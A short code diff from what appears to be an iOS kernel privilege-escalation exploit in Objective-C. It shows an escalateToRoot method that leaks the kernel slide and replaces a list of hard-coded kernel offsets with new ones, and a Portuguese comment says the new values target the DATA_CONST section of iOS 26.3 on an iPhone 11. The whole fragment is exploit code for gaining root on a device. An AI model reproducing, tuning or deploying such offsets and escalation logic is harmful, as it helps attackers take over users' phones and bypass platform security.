@@ -108,7 +108,8 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 
 - (BOOL)escalateToRoot {
     uint64_t slide = [self leakKernelSlide]; // 0xff7ffc000
-    uint64_t base_tentativas[] = {0x8F50000, 0x8F54000, 0x91F0000, 0x91F4000};
+    // Offsets específicos para a seção DATA_CONST do iOS 26.3 (iPhone 11)
+    uint64_t base_tentativas[] = {0xA1F0000, 0xA210000, 0x9F50000, 0x8F50000};
     uint64_t proc = 0;
 
     for (int i = 0; i < 4; i++) {
